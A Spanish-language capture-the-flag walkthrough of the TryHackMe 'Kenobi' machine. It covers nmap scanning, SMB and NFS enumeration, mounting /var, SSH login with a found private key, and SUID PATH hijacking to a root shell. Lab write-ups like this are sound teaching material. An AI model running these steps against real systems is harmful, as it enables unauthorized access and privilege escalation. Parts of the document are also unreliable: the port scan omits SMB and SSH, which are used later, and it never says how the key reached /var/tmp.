
## 📌 Información General

- Plataforma: TryHackMe
    
- Máquina: Kenobi
    
- Tipo: Linux
    
- Dificultad: Easy / Beginner-Intermediate
    
- Objetivo: Obtener acceso inicial + escalada a root
    

---

# 🔍 1. Reconocimiento

## Escaneo completo de puertos

Se realiza un escaneo completo para evitar falsos negativos:

```bash
nmap -p- -T4 10.129.138.32
```

### Resultado:

```text
111/tcp   open  rpcbind
2049/tcp  open  nfs
39789/tcp open  mountd
44609/tcp open  nlockmgr
54271/tcp open  mountd
59095/tcp open  mountd
```

---

## Enumeración de servicios

```bash
nmap -sC -sV -p 111,2049,39789,44609,54271,59095 10.129.138.32
```

### Hallazgos clave:

- RPC (111)
    
- NFS (2049)
    
- mountd (NFS shares)
    

👉 **Conclusión:**  
El sistema expone un recurso NFS → posible acceso a filesystem remoto.

---

# 📂 2. Enumeración SMB

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.129.138.32
```

### Shares encontrados:

- `anonymous`
    
- `print$`
    
- `IPC$`
    

👉 Total: **3 shares**

---

## Acceso al share anónimo

```bash
smbclient //10.129.138.32/anonymous
```

```bash
ls
get log.txt
```

---

## 📄 Análisis de log.txt

Contenido relevante:

```text
/home/kenobi/.ssh/id_rsa
```

👉 **Insight crítico:**  
Se ha generado una clave privada SSH para el usuario `kenobi`.

---

# 📡 3. Enumeración NFS

```bash
showmount -e 10.129.138.32
```

### Resultado:

```text
/var *
```

👉 El directorio `/var` está exportado

---

## Montaje del recurso

```bash
mkdir /tmp/nfs
sudo mount -t nfs 10.129.138.32:/var /tmp/nfs
```

---

## Exploración

```bash
cd /tmp/nfs
ls
```

Directorios relevantes:

- backups
    
- www
    
- tmp ← 🔥
    

---

## 🎯 Descubrimiento clave

```bash
cd /tmp/nfs/tmp
ls
```

```text
id_rsa
```

👉 **Se encuentra la clave privada SSH**

---

# 🔐 4. Acceso inicial (SSH)

## Copiar clave localmente

```bash
cp /tmp/nfs/tmp/id_rsa ~/id_rsa
chmod 600 ~/id_rsa
```

---

## Conexión SSH

```bash
ssh -i ~/id_rsa kenobi@10.129.138.32
```

👉 Acceso obtenido como usuario:

```bash
kenobi@kenobi:~$
```

---

# 💥 5. Escalada de privilegios

## Enumeración de binarios SUID

Se identifica:

```bash
/usr/bin/menu
```

---

## Ejecución

```bash
/usr/bin/menu
```

Menú:

```text
1. status check
2. kernel version
3. ifconfig
```

---

## 🧠 Análisis

El binario ejecuta comandos sin rutas absolutas → vulnerable a:

> 🔥 PATH Hijacking

---

# ⚙️ 6. Explotación (PATH Hijacking)

## Crear binario malicioso

```bash
echo "/bin/bash" > /tmp/ifconfig
chmod +x /tmp/ifconfig
```

---

## Modificar PATH

```bash
export PATH=/tmp:$PATH
```

---

## Ejecutar menú

```bash
/usr/bin/menu
```

Seleccionar:

```text
3
```

---

## 💥 Resultado

```bash
root@kenobi:~#
```

---

# 🏁 7. Flag root

```bash
cat /root/root.txt
```

---

# 🧠 Conclusiones

## 🔑 Vector de ataque

1. SMB → acceso a información
    
2. NFS → acceso a filesystem
    
3. SSH → acceso inicial
    
4. SUID + PATH Hijacking → root
    

---

## 🎯 Técnicas utilizadas

- Enumeración SMB
    
- Enumeración NFS
    
- Montaje remoto
    
- Uso de claves SSH
    
- PATH Hijacking
    
- Abuso de binarios SUID
    

---

## 🚀 Lecciones clave

- No confiar solo en puertos comunes
    
- Correlacionar información entre servicios
    
- Revisar `/var` en entornos NFS
    
- Detectar comandos sin rutas absolutas en SUID
    

---

## 🧪 Mejora para automatización

Este escenario es ideal para scripts que:

- Detecten NFS automáticamente
    
- Monten shares
    
- Busquen claves SSH
    
- Enumeren SUID vulnerables
    

---

# 🏆 Estado final

✔ Acceso inicial obtenido  
✔ Escalada completada  
✔ Máquina comprometida

---

**Writeup completado — Kenobi comprometida con éxito** 🔥